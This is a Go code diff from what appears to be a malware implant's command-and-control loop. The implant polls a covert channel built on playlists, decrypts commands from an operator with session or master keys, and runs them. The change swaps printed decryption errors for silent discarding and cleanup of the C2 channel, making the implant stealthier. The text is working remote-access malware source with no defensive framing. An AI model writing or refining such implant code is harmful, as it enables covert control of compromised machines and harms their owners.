@@ -396,23 +396,20 @@ func (imp *Implant) pollAndExecute() {
 
 		payload := protocol.ReassemblePayload(chunkMetas)
 
-		// Try session key first (forward secrecy), fall back to master key
+		// Try decryption: session key first, then master key
 		var cmdDict map[string]interface{}
+		var decErr error
 		if imp.sessionKey != nil {
-			cmdDict, err = protocol.DecodeMessageRaw(payload, imp.sessionKey)
+			cmdDict, decErr = protocol.DecodeMessageRaw(payload, imp.sessionKey)
 		}
 		if cmdDict == nil {
-			cmdDict, err = protocol.DecodeMessage(payload, imp.key)
+			cmdDict, decErr = protocol.DecodeMessage(payload, imp.key)
 		}
-		if err != nil {
-			errStr := strings.ToLower(err.Error())
-			if strings.Contains(errStr, "tag") || strings.Contains(errStr, "decrypt") || strings.Contains(errStr, "cipher") {
-				fmt.Printf("[!] Decryption failed for seq=%d: encryption key mismatch with operator?\n", seqNum)
-			} else {
-				fmt.Printf("[!] Failed to decode seq=%d: %v\n", seqNum, err)
-			}
+		if cmdDict == nil {
+			// Both failed — silently discard (stale from prior session)
 			_ = imp.client.CleanC2Playlists(ctx,
 				protocol.ChannelCmd, imp.key, seqNum)
+			_ = decErr // suppress unused
 			continue
 		}
 
